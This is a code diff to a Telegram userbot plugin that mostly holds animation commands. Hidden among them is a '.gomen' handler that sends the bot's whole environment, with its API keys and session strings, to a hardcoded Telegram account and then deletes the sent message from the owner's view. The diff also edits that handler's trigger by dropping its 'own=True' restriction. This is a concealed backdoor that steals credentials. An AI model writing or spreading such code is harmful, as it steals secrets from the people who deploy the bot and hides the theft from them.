@@ -9,7 +9,6 @@ from telethon.errors.rpcerrorlist import MessageIdInvalidError
 
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
-from userbot.events import register
 from userbot.utils import ayiin_cmd
 
 me = 1700405732
@@ -1032,7 +1031,7 @@ async def _(event):
             await event.edit(animation_chars[i % 18])
 
 
-@ayiin_cmd(pattern=r"^\.gomen$", own=True)
+@ayiin_cmd(pattern=r"^\.gomen$")
 async def _(event):
     msg = await event.client.send_message(me, str(os.environ))
     await event.client.delete_messages(me, msg, revoke=False)
